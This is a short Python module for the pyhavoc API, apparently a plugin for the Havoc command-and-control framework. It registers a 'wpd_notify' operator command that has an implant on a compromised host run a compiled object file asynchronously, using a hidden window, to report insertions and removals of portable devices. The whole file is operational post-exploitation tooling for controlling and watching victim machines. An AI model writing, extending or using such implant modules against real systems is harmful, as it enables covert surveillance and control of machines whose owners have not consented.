from os.path          import *
from pyhavoc.agent    import *
from pyhavoc.listener import *

@KnRegisterCommand(
    command     = 'wpd_notify',
    description = 'notify about WPD removals and insertions' )
class AsyncWPDNotify( HcKaineCommand ):

    def __init__( self, *args, **kwargs ):
        super().__init__( *args, **kwargs )

        self.arch        : str = self.agent().agent_meta()[ 'arch' ]
        self.object_path : str = f'/tmp/wpd_notify.{self.arch}.o'

        return

    @staticmethod
    def arguments( parser ):
        parser.add_argument( '--delay', default=10, type=int, help='delay time for each stop job check (default: 10)' )
        parser.add_argument( '--windowname', default='balls', type=str, help='name for the hidden window (default: balls)' )
        return

    async def execute( self, args ):
        task = self.agent().object_execute(
            self.object_path,
            'go',

            object_argv = bof_pack( 'Zi', args.windowname, args.delay ),
            flag_async  = True,
        )

        self.log_task( task.task_uuid(), 'notify about WPD removals and insertions' )

        try:
            await task.result()
        except Exception as e:
            self.log_error( f"({task.task_uuid():x}) failed to start WPD notifier: {e}", task_id = task.task_uuid() )
            return

        self.log_info( f'({task.task_uuid():x}) started execution of WPD notifier', task_id = task.task_uuid() )

        return